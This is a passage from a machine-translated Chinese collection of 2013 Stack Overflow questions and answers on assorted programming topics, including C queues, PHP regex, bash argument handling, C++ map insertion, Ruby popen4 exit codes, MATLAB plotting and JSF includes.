我可能会为此做的是将您的脚本片段添加为一个函数，然后在每次幻灯片更改时调用该函数。这意味着您需要对插件进行轻微修改。看看插件，主要的动画函数被简单地调用了`animate()`。

举个简单的例子

```
updateHeight = function(){
   articleImageHeight = $('.slides_control').height();
   $('.individual-article-contents').css('margin-top', articleImageHeight);
} 
```

上面将您的位添加到函数中，然后添加`updateHeight();`到第 236 行...如果您使用的是插件的未缩小版本。

就在上面写着的那一行`} // end animate function`

..只是一个想法，看起来更好的是使用`.animate`而不是`.css`更新上边距......但是嘿，我不知道你在做什么，所以完全取决于你。

**----EDIT----** 只是一个更新......我们在插件上发现了一个 animateComplete() 回调，它很有魅力。

# c - C队列，按排序顺序复制元素

> ID：14916445
> 
> 赞同：0
> 
> 时间：2013-02-16T23:47:30.060
> 
> 标签：c, queue

所以

如果我有一个队列

```
a --> b --> NULL; 
```

当我使用一个函数时

```
void duplicate(QueueNodePtr pHead, QueueNodePtr *pTail) 
```

它会给

```
a --> a --> b --> b --> NULL 
```

我无法通过仅参考尾巴进行排序来绕过我的头脑。

我能做的就是

```
a --> b --> a --> b --> NULL 
```

你会如何处理这个？

基本代码很好，但我需要的是提示，

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:00:22.810

如果您可以找出队列中的元素数（N），那么您可以简单地执行以下操作：

```
for i = 1 to N
  e = remove(queue)
  insert(queue, e)
  insert(queue, e) 
```

您将使用队列操作复制每个元素。

如果您想直接操作数据，那么它不再是一个队列——它是一个（链接的）列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:01:03.893

您不能从队列中弹出项目并将它们两次推送到新队列中吗？

编辑：如果您需要原始队列来存储结果，是什么阻止您从临时队列中弹出这些项目并将其推回原始队列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T00:12:24.357

我在下面有一个简短的伪代码，它试图实现您的目标

```
void duplicateQueue(QueueNode *head, QueueNode *tail)
{
    QueueNode *curr;
    QueueNode *node;

    //Initialize curr to head
    curr = head
    do
    {
        // Create a new node
        node = (QueueNode *) malloc(sizeof(QueueNode));

        // Initilaize the node
        node->data = curr->data;

        // Create link from node to curr->next
        node->next = curr->next;

        //Create a link from current to new node
        curr->next = node;

        // move current to next original element
        curr = node->next;

    }while(curr != NULL); 
```

}

# c# - 在 Azure TableClient 2.0 中使用分段执行进行分页

> ID：14916447
> 
> 赞同：1
> 
> 时间：2013-02-16T23:47:39.270
> 
> 标签：c#, .net, asynchronous, azure, azure-table-storage

如何使用分段执行在 Azure TableClient 2.0 中实现分页？
是否可以实现以下功能

```
 IEnumerable<Message> GetMessages(int currentPage, int pageSize)
{  

} 
```

基于这个[问题](https://stackoverflow.com/questions/13426430/how-do-i-use-azure-tableclient-2-0-beginexecutequerysegmented)，我可以获取所需的记录数，但我不知道如何跳过页面或设置起点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T04:41:38.533

此功能在核心平台中不可用。Windows Azure 表服务提供了由 ADO.NET 数据服务框架定义的有限查询选项子集。有关可用选项的列表，请参见此处：http: [//msdn.microsoft.com/en-us/library/windowsazure/dd135725.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/dd135725.aspx)。

为了实现这样的事情，您需要在客户端（即您的应用程序/服务）获取整个数据并实现分页。对于较小的数据，这没什么大不了的，但是当您开始处理大型数据集时，获取整个数据将是一个问题。

# php - 如何反向引用这个字符串（php）

> ID：14916450
> 
> 赞同：1
> 
> 时间：2013-02-16T23:47:43.437
> 
> 标签：php, regex, preg-match, backreference

我正在尝试匹配由一些数字组成的字符串中的“ID”（范围从 1 位到 ~9 （关键是它的长度可变）。以下代码不会反向引用我的 ID，我我对 PHP 很陌生，我试过谷歌但没有好的答案。

```
<?php
$to = 'data-hovercard="/ajax/hovercard/user.php?id=100002781344760">Ae fj';

preg_match('/user.php?id=[\d]+\\"/', $to, $matches);

echo $matches[0];
?> 
```

重点是在“/ajax/hovercard/user.php?id=100002781344760">”中获取“10000278134476”。任何有用的正则表达式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:54:38.333

添加`()`s 来标记组应该可以工作，或者如果你想让它更有意义，你可以尝试使用命名组`(?<name>)`：

```
preg_match('/user.php?id=([\d]+)\\"/', $to, $matches);
//                       ^     ^
echo $matches[1]; // capture groups indexed from 1, 0 index is for the whole matched string 
```

有关模式 sytnax 的更多信息，请参阅[文档。](http://www.php.net/manual/en/regexp.reference.subpatterns.php)

# php - 如果引擎是 MyISAM，则表中没有外键

> ID：14916452
> 
> 赞同：0
> 
> 时间：2013-02-16T23:47:58.263
> 
> 标签：php, mysql, phpmyadmin

为什么我不能在我的付款表中创建外键。

```
crate table students(
text char(5)NOT NULL,
id int(11)NOT NULL AUTO_INCREMENT,
name varchar(250),
level varchar(250),
PRIMARY KEY (text,id)
)ENGINE=MyISAM; 
```

订单表是

```
 crate table payments(
    p_id int(11)NOT NULL AUTO_INCREMENT,
    amount varchar(250),
    id int
    PRIMARY KEY (p_id)
FOREIGN KEY (id) REFERENCES students(id)
    )ENGINE=MyISAM; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:49:20.013

因为 MyISAM 不支持外键。FK 声明被解析，否则被忽略。您需要使用 InnoDB 表来获得真正的 FK 支持。

# java - 将自定义设置添加到 PreferenceFragment

> ID：14916459
> 
> 赞同：0
> 
> 时间：2013-02-16T23:48:44.073
> 
> 标签：java, android

我有一个`PreferenceFragment`，我需要在其中放入自定义首选项。现在问题不在于自定义首选项本身，我已经扩展了一些`DialogPreference`创建自己的首选项并且我已经处理了保存/恢复数据；问题是如何将这些自定义首选项添加到我的`PreferenceFragment`？我无法在 XML 中声明它们（可以吗？），也找不到任何方法将它们动态添加到我的`PreferenceFragment`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:14:41.647

自己没有尝试过，但是对于基于 xml 的方法，也许你可以这样做：

```
<com.mypackage.MyPreference
        android:defaultValue="value"
        android:key="key"
        android:title="Title"/> 
```

然后`addPreferencesFromResource()`照常使用。

# raphael - 如何制作流畅的圆弧动画？

> ID：14916460
> 
> 赞同：1
> 
> 时间：2013-02-16T23:48:52.753
> 
> 标签：raphael

[见 jsfiddle](http://jsfiddle.net/mnbayazit/Fh43X/)

这是我的代码：

```
var paper = Raphael("holder");

function sector(cx, cy, r, startAngle, endAngle) {
    var x1 = cx + r * Math.cos(-startAngle),
        y1 = cy + r * Math.sin(-startAngle),
        x2 = cx + r * Math.cos(-endAngle),
        y2 = cy + r * Math.sin(-endAngle);
    return ['M', cx, cy, 'L', x1, y1, 'A', r, r, 0, +(endAngle - startAngle > Math.PI), 0, x2, y2, 'z'];
}

var path = paper.path(sector(200, 200, 107, 0, 0.25)).attr({
    'fill': '#fff',
        'fill-opacity': 0.5,
        'stroke': 'none'
});
path.animate({
    path: sector(200, 200, 107, 0, Math.PI / 2)
}, 1000); 
```

问题是在中间动画中它不遵循圆形路径，而是得到了这个奇怪的扁平化的东西：

![](../Images/857c15063c83e4928c0da38c23753c8c.png)

如何使动画始终保持圆形？

我本质上想创建一个“加载馅饼”。馅饼应该动画成一个完整的圆圈。

从“空”到 60% 的动画看起来更糟：http: [//jsfiddle.net/mnbayazit/Fh43X/3/](http://jsfiddle.net/mnbayazit/Fh43X/3/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:10:31.390

在挖掘了他们的一些例子后[想通了。](http://jsfiddle.net/Fh43X/4/)

```
var r = Raphael("holder");

r.customAttributes.segment = function (x, y, r, a1, a2) {
    var flag = (a2 - a1) > 180,
        clr = (a2 - a1) / 360;
    a1 = (a1 % 360) * Math.PI / 180;
    a2 = (a2 % 360) * Math.PI / 180;
    return {
        path: [
            ["M", x, y],
            ["l", r * Math.cos(a1), r * Math.sin(a1)],
            ["A", r, r, 0, +flag, 1, x + r * Math.cos(a2), y + r * Math.sin(a2)],
            ["z"]
        ]
    };
};

var p = r.path().attr({
    segment: [200, 200, 100, 0, 0],
    stroke: 'none',
    fill: '#fff',
    'fill-opacity': 0.5
});
p.animate({
    segment: [200, 200, 100, 0, 359]
}, 2000); 
```

# jquery - 如何在 asp.net 中维护 jqxGrid 的视图状态？

> ID：14916461
> 
> 赞同：0
> 
> 时间：2013-02-16T23:48:55.793
> 
> 标签：jquery, asp.net, viewstate, jqxgrid

我在 jqWidgets 库中使用 jqxGrid。问题是当在回发到服务器的页面上执行事件时，网格将为空，这是合乎逻辑的，因为它绑定在 js 中，不像传统的 asp.net gridview。所以 jqxGrid 似乎是惊人的 gridview 但不幸的是，如果它不能对其状态进行基本维护，它就没有用了。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:20:46.270

Take a look at this: [saveloadstate.htm](http://www.jqwidgets.com/jquery-widgets-demo/demos/jqxgrid/saveloadstate.htm?classic). I hope it helps you.

# php - 我可以在使用 htaccess RewriteRule 时通过 URL 传递变量吗？

> ID：14916467
> 
> 赞同：2
> 
> 时间：2013-02-16T23:49:54.373
> 
> 标签：php, .htaccess, mod-rewrite

我想知道是否可以在已经使用 .htacces 传递变量的同时通过 URL 传递另一个变量？

例如，

```
RewriteRule ^browse/([a-zA-Z-]+)/?$ browse/index.php?brand=$1 
```

可以说，`website.com/browse/index.php?brand=louis-vuitton` 被改写成`website.com/browse/louis-vuitton`

我是否可以使用这样的另一个变量：

```
website.com/browse/louis-vuitton/?sort=name 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-16T23:54:53.050

是的，您只需在重写条件后添加 [QSA]

```
RewriteRule ^browse/([a-zA-Z-]+)/?$ browse/index.php?brand=$1 [QSA] 
```

[http://wiki.apache.org/httpd/RewriteFlags/QSA](http://wiki.apache.org/httpd/RewriteFlags/QSA)

# vb.net - 如何通过 USB 端口从设备读取 GPS 坐标

> ID：14916469
> 
> 赞同：1
> 
> 时间：2013-02-16T23:50:08.030
> 
> 标签：vb.net, gps, usb, coordinates, garmin

我需要使用 VB.NET 程序直接从通过 USB 连接到计算机的 GPS 设备读取 GPS 坐标（蓝牙也可以，但更喜欢 USB）。我的限制是：

1.  运行该软件的计算机未连接到 Internet。它是移动车辆中的独立机器。
2.  我需要能够在车辆移动时从设备读取 GPS 坐标，并使用设备在本地数据库上执行位置感知查询
3.  GPS 设备可以是任何东西（例如 Garmin GPS 或不带显示屏的 GPS 卡），只要它可以现成或通过互联网购买即可。
4.  此解决方案的用户组非常小（大约 40 个用户）。

我已经检查了 GPSGate ( [http://gpsgate.com/](http://gpsgate.com/) ) 并将我的要求通过电子邮件发送给他们。他们回答，我引用：“很抱歉，我们没有适合你的产品。” （回复结束）。

我还检查了[Eye4Software](http://www.eye4software.com/)）并尝试使用他们的演示产品，但它没有通过 USB 连接我的 Garmin Nuvi。他们回答了我的问题，但不幸的是，他们的 OEM 产品是一个 ActiveX dll，我正在寻找一个基于 .NET 的解决方案。

因此，如果有人拥有基于 .NET 框架的“本土”解决方案，并且可以轻松复制，我将不胜感激。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:02:05.470

大多数 USB GPS 定位器都使用称为[NMEA 0183](http://en.wikipedia.org/wiki/NMEA_0183)的标准化协议。有几个 .net 协议可以解码此协议，请参阅[此处](https://stackoverflow.com/questions/173497/c-sharp-open-source-nmea-parser)了解一些入门指南。

因此，如果在您周围购物时只需检查设备是否能够生成 NMEA，您应该在最短的时间内以合理的成本启动并运行。

编辑：“gps puck”是一个 GPS 接收器，形状或多或少像一个冰球，就像这个

![在此处输入图像描述](../Images/39f5f4eb2227b3c4ed37a2349b01a5d5.png)

对于车内使用，有可以固定在车顶上的特定版本

![在此处输入图像描述](../Images/4f7f7a3ced1a9baf8ff6972894513a49.png)

它们很常见（[许多网上商店](http://www.efrontier.co.nz/estore/index.php?cPath=2_3&osCsid=2a1f9320f6f69f8ad93568fe15d92ee8)都有），但根据内部芯片选择它们，流行的 Sirf Star 3 仍然表现稳定，稳定准确。我还没有机会与它的继任者 Sirf Star 4 一起玩，我并不是说这些是周围唯一的好芯片，只是我在这个芯片上获得了最多的经验。

# git - Shell：使用除一个参数以外的所有参数运行其他命令

> ID：14916472
> 
> 赞同：0
> 
> 时间：2013-02-16T23:50:43.090
> 
> 标签：git, bash, shell

我想创建一个脚本名称`git-as`，它基本上是`git`使用一堆预定义参数调用的别名。

```
git --git-dir="$1/.git" --work-tree="$1/" <<OTHER PARAMS>> 
```

当我想在另一个存储库中调用 git 时，我使用：

```
git-as "$SRC_REPO" commit -m "Changes made to $CLASS_NAME" 
```

如何让“其他参数”位正常工作？

请记住，我**不**希望将`$1`参数（包含存储库位置）传递给 git。此外，其他参数可能包括双引号，例如示例中使用的双引号。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:16:37.160

在 bash（但不是所有其他 shell）中，您可以使用[数组切片](http://mywiki.wooledge.org/BashFAQ/005#Retrieving_with_modifications)的变体来挑选一些参数，而无需`shift`先获取其他参数：

```
#!/bin/bash
git --git-dir="$1/.git" --work-tree="$1/" "${@:2}" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-16T23:57:11.370

Shell 脚本允许使用`shift n`左移 $*/$@ 参数，这可能适合您的目的。

```
# t.sh
echo ARGS $*
shift 
echo ARGS $* 
```

`bash t.sh 1 2 3 4 5`给

```
ARGS 1 2 3 4 5
ARGS 2 3 4 5 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-17T00:05:42.087

这是我的做法：

```
#!/bin/bash
readonly Directory="$1"
shift
git --git-dir="$Directory/.git" "$@" 
```

首先，这会将存储库位置 ( ) 复制`$1`到另一个变量 ( `$Directory`)。然后它将[`shift`](http://ss64.com/bash/shift.html)所有程序参数向左移动一个，因此`$@`只包含用于 Git 的参数。从那里开始，只需使用新参数调用 Git 即可。

# c++ - std::map<>::insert 使用不可复制对象和统一初始化

> ID：14916474
> 
> 赞同：16
> 
> 时间：2013-02-16T23:51:07.943
> 
> 标签：c++, c++11, noncopyable, movable

看看下面的代码：

```
#include <utility>
#include <map>

// non-copyable but movable
struct non_copyable {
    non_copyable() = default;

    non_copyable(non_copyable&&) = default;
    non_copyable& operator=(non_copyable&&) = default;

    // you shall not copy
    non_copyable(const non_copyable&) = delete;
    non_copyable& operator=(const non_copyable&) = delete;
};

int main() {
    std::map<int, non_copyable> map;
    //map.insert({ 1, non_copyable() });  < FAILS
    map.insert(std::make_pair(1, non_copyable()));
    // ^ same and works
} 
```

取消注释 g++ 4.7 上的标记行时，编译此代码段失败。产生的错误表明`non_copyable`无法复制，但我希望它会被移动。

为什么插入`std::pair`使用统一初始化构造的构造失败但使用构造构造失败`std::make_pair`？两者都不应该产生可以成功移动到地图中的右值吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-17T00:05:14.273

[这是一个完整的重写。我之前的回答与问题无关。]

`map`有两个相关的`insert`重载：

*   `insert(const value_type& value)`， 和

*   `<template typename P> insert(P&& value)`.

当您使用简单的 list-initializer`map.insert({1, non_copyable()});`时，会考虑所有可能的重载。但是只找到第一个（拿走的`const value_type&`），因为另一个没有意义（没有办法神奇地猜测你打算创建一对）。第一个重载当然不起作用，因为您的元素不可复制。

您可以通过显式创建对来使第二个重载工作，或者使用`make_pair`，正如您已经描述的那样，或者通过显式命名值类型：

```
typedef std::map<int, non_copyable> map_type;

map_type m;
m.insert(map_type::value_type({1, non_copyable()})); 
```

现在列表初始化器知道要寻找`map_type::value_type`构造函数，找到相关的可移动构造函数，结果是一个右值对，它绑定到函数的`P&&`-overload `insert`。

（另一种选择是`emplace()`与`piecewise_construct`and一起使用`forward_as_tuple`，尽管这样会更冗长。）

我想这里的寓意是列表初始化器寻找可行的重载——但他们必须知道要寻找什么！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-02-26T06:58:34.653

除了提供移动（赋值）构造函数的其他答案外，您还可以通过指针存储不可复制的对象，尤其是`unique_ptr`. `unique_ptr`将为您处理资源移动。

# mysql - MySQL：没有加入者的 LEFT JOIN 的惩罚......

> ID：14916476
> 
> 赞同：0
> 
> 时间：2013-02-16T23:51:16.447
> 
> 标签：mysql, performance, join

我很想知道调用 a`LEFT JOIN`而没有什么可加入的查询惩罚是什么。

我有两个表：`main`has `.ID`，`.type`and `.info`，`additional`has `.ID`and`.more_info`

我正在运行这个查询：

`SELECT main.*, additional.* FROM main LEFT JOIN additional ON main.ID = additional.ID`

我很清楚 70% 的时间，我会查询一个`main.type`没有*附加信息*的 - 没有条目，`additional`但由于限制，我总是必须包含 LEFT JOIN 语句。

这将导致多少查询惩罚（时间）——如果有的话？

EG是：

`SELECT * FROM main WHERE type = 'no additional'`

将明显快于：

`SELECT main.*, additional.* FROM main LEFT JOIN additional ON main.ID = additional.ID WHERE main.type = 'no additional'`?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:53:46.467

你为什么不做基准呢？没有获得比赛不会受到处罚。MySQL 必须扫描连接字段的索引来检查是否有匹配项。

如果有的话，获取连接结果实际上是一种惩罚，因为现在 MySQL 必须挖掘表文件才能带回结果。

# ruby-on-rails - 如何使用 popen4 捕获未找到的命令

> ID：14916478
> 
> 赞同：2
> 
> 时间：2013-02-16T23:51:37.673
> 
> 标签：ruby-on-rails, ruby, rake, popen

我正在使用 popen4 来捕获 stdout、stderr 和命令行的退出状态。只要我能捕捉到上面的这三件事，我就不会被 popen4 束缚。目前我还没有找到捕获命令未找到错误的好方法。我想我可以做一个`which cmd`预先任务，但希望有一些内置的东西。

您可以在下面运行一个好任务、坏任务和一个假任务来查看差异。我正在`rails new app`用`popen4`宝石做这件事

```
#!/usr/bin/env rake
# Add your own tasks in files placed in lib/tasks ending in .rake,
# for example lib/tasks/capistrano.rake, and they will automatically be available to Rake.

require File.expand_path('../config/application', __FILE__)

require 'open4'

# returns exit status 0, all is good
task :convert_good do
  puts "convert good"
  `wget https://www.google.com/images/srpr/logo3w.png`
  status = Open4.popen4("convert logo3w.png output.jpg") do |pid, stdin,stdout,stderr|
    stdin.close
    puts "stdout:"
    stdout.each_line { |line| puts line }
    puts "stderr: #{stderr.inspect}"
    stderr.each_line { |line| puts line }
  end
  puts "status: #{status.inspect}"
  puts "exit:   #{status.exitstatus}"
end

# returns exit status 1, we messed up our command
task :convert_bad do
  puts "convert bad"
  status = Open4.popen4("convert logo3w-asdfasdf.png output.jpg") do |pid, stdin,stdout,stderr|
    stdin.close
    puts "stdout:"
    stdout.each_line { |line| puts line }
    puts "stderr: #{stderr.inspect}"
    stderr.each_line { |line| puts line }
  end
  puts "status: #{status.inspect}"
  puts "exit:   #{status.exitstatus}"
end

# I want this to return exit code 127 for command not found
task :convert_none do
  puts "convert bad"
  status = Open4.popen4("convert_not_installed") do |pid, stdin,stdout,stderr|
    stdin.close
    puts "stdout:"
    stdout.each_line { |line| puts line }
    puts "stderr: #{stderr.inspect}"
    #it doesnt like stderr in this case
    #stderr.each_line { |line| puts line }
  end
  puts "status: #{status.inspect}"
  puts "exit:   #{status.exitstatus}"
end 
```

这是 3 个本地输出

```
# good
stdout:
stderr: #<IO:fd 11>
status: #<Process::Status: pid 17520 exit 0>
exit:   0

# bad arguments
convert bad
stdout:
stderr: #<IO:fd 11>
convert: unable to open image `logo3w-asdfasdf.png': No such file or directory @ blob.c/OpenBlob/2480.
convert: unable to open file `logo3w-asdfasdf.png' @ png.c/ReadPNGImage/2889.
convert: missing an image filename `output.jpg' @ convert.c/ConvertImageCommand/2800.
status: #<Process::Status: pid 17568 exit 1>
exit:   1

# fake command not found, but returns exit 1 and stderr has no lines
convert bad
stdout:
stderr: #<IO:fd 11>
status: #<Process::Status: pid 17612 exit 1>
exit:   1 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T01:59:04.363

先说几点。

1.  您实际上并没有使用*popen4* gem - 它是 open4 gem 的包装器*（*至少如果您在 Unix 系统上运行） - 您直接使用*open4* gem。如果你想使用*popen4*，你可以这样称呼它：

    ```
    status = POpen4.popen4('cmd') do |stdout, stderr, stdin, pid|
      # ...
    end 
    ```

2.  popen4方法最终通过**Kernel#exec****方法**执行指定的命令，其行为取决于它是否确定给定命令应该在 shell 中运行。（您可以查看[http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-exec](http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-exec)，但这并不是很有帮助。源代码是更好的选择。）

 **例如：

```
>  fork { exec "wibble" }
 => 1570 
> (irb):56:in `exec': No such file or directory - wibble (Errno::ENOENT)
    from (irb):56:in `irb_binding'
    from (irb):56:in `fork'
    from (irb):56:in `irb_binding'
    from /Users/evilrich/.rvm/rubies/ree-1.8.7-2011.03/lib/ruby/1.8/irb/workspace.rb:52:in `irb_binding'
    from :0 
```

在这里，**exec**试图直接执行不存在的命令“wibble”——因此出现了异常。

```
> fork { exec "wibble &2>1" }
 => 1572 
> sh: wibble: command not found 
```

在这里，**exec**看到我正在使用重定向，因此在 shell 中执行了我的命令。区别？我在 STDERR 上收到错误，没有例外。您还可以通过在要执行的命令中指定来强制使用 shell：

```
> fork { exec "sh -c 'wibble -abc -def'" } 
```

无论如何，了解**Kernel#exec**的行为可能有助于让**popen4**方法按照您希望的方式运行。

要回答您的问题，如果我使用*popen4* gem 并以这样的方式构造命令（根据 exec 的规则）它将在 shell 中运行，或者如果我自己在命令中使用“sh -c ...”，然后我得到了我认为你正在寻找的那种行为：

```
> status = POpen4.popen4("sh -c 'wibble -abc -def'") {|stdout, stderr, stdin, pid| puts "Pid: #{pid}"}
Pid: 1663
 => #<Process::Status: pid=1663,exited(127)> 
> puts status.exitstatus
127 
```

**更新**

有趣的。**如果**您从 stderr 读取，**Open4.popen**也将返回 127 退出状态。所以，没有必要使用*popen* gem。

 ***```
> status = Open4.popen4("sh -c 'wibble -abc -def'") {|pid, stdin, stdout, stderr| stderr.read }
 => #<Process::Status: pid 1704 exit 127> 
```*****

# matlab - MATLAB：限制绘制值的范围

> ID：14916479
> 
> 赞同：0
> 
> 时间：2013-02-16T23:51:46.927
> 
> 标签：matlab

我根本不是 Matlab 用户，但我现在只是想使用它创建一个快速而肮脏的 2D 图来说明相对 O-notation 的复杂性，以避免手工绘制它。我使用的是 Matlab 版本 R2010b，我没有额外的工具包。我的问题由两部分组成。我想在同一个情节上绘制以下案例的情节：

```
O(1)
O(lg2 n)
O(n)
O(n lg2 n)
O(n * n)
O(2 ^ n)
O(n!) 
```

我的代码在这篇文章的末尾。

问题 1：虽然我已经指定了 n 的值范围和我想要的轴限制，但显然 n-squared 和 n-factorial 的值将大大超出所需的 y 轴范围。发生这种情况时，它会大大压缩 y 轴图以适应该范围的输出。如何指定不应将 y 的值绘制在 y 轴本身所需范围的所需范围之外？

问题 2：在我下面的代码中，表达式 n * log2(n) 导致错误指出“内部矩阵尺寸必须一致”。当我尝试通过简单地执行 n * n 来计算 n 平方时，我遇到了同样的错误，但我能够通过将其更改为 n.^2 来解决这个问题。表达 n * log2(n) 的正确方法是什么？

谢谢，雷

```
grid on
axis([0,40,0,200]);
n = 0:1:40;

O_1 = 0;
O_log2_n = log2(n);
O_n = n;
O_n_log2_n = n * log2(n);    % Doesn't work this way
O_log2_nSq = n.^2;
O_log2_nFact = factorial(n);

plot(n, O_1, n, O_log2_n, n, O_n, n, O_n_log2_n, n, O_log2_nSq, n, O_log2_nFact);

text(37, 37, '   O(n)', 'HorizontalAlignment','left','FontSize',12);
set(gca, 'XTick', [0, 10, 20, 30, 40]);
set(gca, 'YTick', [0, 50, 100, 150, 200]);
xlabel('n','FontSize',16);
ylabel('T(n)','FontSize',16);
title('\it{Comparative algorithm growth rates}','FontSize',16); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:02:37.060

1.  看看[ylim](http://www.mathworks.com/help/matlab/ref/ylim.html)

2.  用 进行逐个元素的乘法`.*`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:37:06.293

Matlab 中的`*`算子是矩阵乘法器。因此，它仅在第一个矩阵的第二维与第二个矩阵的第一维相同时才有效（如果矩阵不是二维的，它根本不起作用）。

运算符在“`.*`每个元素”的基础上工作：所以在表达式`C=A.*B`中，你得到

```
C(1,1) = A(1,1) * B(1,1);
C(1,2) = A(1,2) * B(1,2); 
```

等等

注意 - 对于`.*`，矩阵必须具有相同的维度：A(N, M) 和 B(N, M)。对于该`*`操作，您必须有 A(M, N) 和 B(N, P)。另请注意 - Matlab 中的任何“向量”实际上是 1xN（行）或 Nx1（列）矩阵...

要回答您的问题“什么是正确的表达方式`n*log2(n)`” - 使用`n.*log2(n);`

至于以不同的比例绘制事物：您可以使用`semilogy`对数 Y 比例的绘图（如果 Y 值中有零，则无用）或在命令`ylim([lower upper])`后用作单独的语句`plot`以获取范围内的输出。

如果您想在 Y 值为零时变得聪明并使用符号学，您可以执行以下操作：

```
notZero = find(Y>0);
semilogy(X(notZero),Y(notZero); 
```

# jsf - 动态的 根据 不包括任何东西

> ID：14916484
> 
> 赞同：3
> 
> 时间：2013-02-16T23:52:11.663
> 
> 标签：jsf, dynamic, jsf-2, uirepeat, uiinclude

我是 JSF 的新手，我正在努力动态渲染包含的页面。我的代码如下所示：

菜单豆

```
@ViewScoped
public class MenuBean implements Serializable {

    private MenuItem[] menuItems = new MenuItem[] {
        new MenuItem("page_1", "/page_1.xhtml"),
        new MenuItem("page_2", "/page_2.xhtml"),
    };

    private String selectedItemLabel;

    //...
} 
```

菜单项

```
public class MenuItem implements Serializable {

    private String label;
    private String page;

    //...
} 
```

索引.xhtml

```
 <ui:repeat var="menuItem" value="#{menuBean.menuItems}">                                    
        <h:panelGroup rendered="#{menuBean.selectedItemLabel eq menuItem.label}" layout="block">
            <h:outputText value="#{menuBean.selectedItemLabel}" />                              
            <ui:include src="#{menuItem.page}" />                                           
        </h:panelGroup>                                                                     
    </ui:repeat> 
```

结果是呈现了 2 个按钮。每当我单击任何按钮时，都会出现有条件渲染的 panelGroup 内的标签，但包含的页面不会出现。如果我从第一个 ui:repeat 更改 'menuItem1' var，它会起作用，但它确实是不可预测的。例如，如果我将 setSelectedItemLabel 参数硬编码为“page_1”，那么当我点击 button_1 时会显示 page_1，但即使我点击 button_2 page_2 (!?) 也会显示...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T03:13:04.693

您正面临视图构建时间与视图渲染时间的问题。这本质上与已[在 JSF2 Facelets 中的 JSTL 中详细回答的问题相同......有意义吗？](https://stackoverflow.com/questions/3342984/jstl-in-jsf2-facelets-makes-sense)在该答案中，将“JSTL”替换为“ui:include”。到目前为止，`<ui:repeat>`在视图渲染期间运行，而`<ui:include>`之前已经在视图构建期间运行。

您会明白，唯一的解决方案是将 替换为`<ui:repeat>`在视图构建期间运行的另一个标记，例如 JSTL `<c:forEach>`。

请注意，我不保证它会解决您想到的具体功能要求。使用 JSTL 可能会产生不希望的“副作用”（不过这些副作用是可以解释的、可以理解的和可以解决的）。

### 也可以看看：

*   [如何通过导航菜单 ajax-refresh 动态包含内容？(JSF SPA)](https://stackoverflow.com/questions/7108668/how-to-ajax-refresh-dynamic-include-content-by-navigation-menu-jsf-spa)

# google-maps-android-api-2 - API 级别 8 到 17 的 Google Maps API V2 android 应用程序

> ID：14916486
> 
> 赞同：2
> 
> 时间：2013-02-16T23:52:42.673
> 
> 标签：google-maps-android-api-2, supportmapfragment, mapfragment

我正在使用 Google 地图 API V2，一切正常。我有一个 2.2.2 的 android 设备，我用它来调试我的应用程序。

现在我刚拿到 Galaxy Note 2，当我尝试在该设备上调试时，应用程序立即崩溃“项目已停止工作”。

所以我只是做了一个小例子来测试。它再次在 2.2.2 上运行良好，但在 4.1.1 上却不行。

这是我用于小示例练习的代码

我们欢迎所有的建议

我的布局

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity" >

    <TextView
        android:id="@+id/tv_location"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" />

    <fragment xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/map"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_below="@id/tv_location"
        class="com.google.android.gms.maps.SupportMapFragment" />
</RelativeLayout> 
```

我的清单

```
 <?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.ss"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="17" />

    <permission 
        android:name="com.example.ss.permission.MAPS_RECEIVE"
        android:protectionLevel="signature"/>

    <uses-permission android:name="com.example.ss.permission.MAPS_RECEIVE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>

    <uses-feature
        android:glEsVersion="0x00020000"
        android:required="true"/>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >

        <uses-library android:name="com.google.android.maps" />
        <activity
            android:name="com.example.ss.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <meta-data
            android:name="com.google.android.maps.v2.API_KEY"
             android:value="my key"/>
    </application>

</manifest> 
```

